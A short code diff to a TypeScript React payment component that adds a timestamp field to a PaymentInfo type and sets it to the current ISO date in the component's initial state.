@@ -19,6 +19,7 @@ type PaymentInfo = {
   bank_card: string[];
   prefix: string;
   status: 'new' | 'pending' | 'approved' | 'rejected';
+  timestamp:string
 };
 const BANKS = [
   {
@@ -136,6 +137,7 @@ export default function Payment(props: any) {
     bank_card: [''],
     prefix: '',
     status: 'new',
+    timestamp:new Date().toISOString()
   });
 
   const handleAddotp = (otp: string) => {
